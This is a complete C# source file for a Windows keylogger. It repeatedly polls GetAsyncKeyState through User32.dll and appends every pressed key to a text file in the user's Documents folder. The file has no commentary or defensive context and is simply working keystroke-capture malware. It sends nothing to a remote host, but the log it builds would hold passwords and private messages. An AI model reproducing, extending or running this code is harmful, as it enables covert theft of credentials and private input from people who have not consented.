using System;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace c4
{
    static class Program
    {
       

            [DllImport("User32.dll")]
            public static extern int GetAsyncKeyState(Int32 i);

            static void Main()
            {
                while (true)
                {
                         String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

                    if (!Directory.Exists(filepath))
                    {
                        Directory.CreateDirectory(filepath);
                    }
                    string path = (filepath + @"\fileofloggedkeys.txt");

                    if (!File.Exists(path))
                    {
                        using (StreamWriter sw = File.CreateText(path)) ;
                    }

                    Thread.Sleep(5);
                    for (Int32 i = 0; i < 255; i++)
                    {
                        int state = GetAsyncKeyState(i);
                        if (state == 32769)
                        {
                        
                        Console.WriteLine((Keys)i);
                             using (StreamWriter sw = File.AppendText(path))
                            {
                                sw.WriteLine((Keys)i);
                            }

                        }
                    }
                }

            }

        }
    }
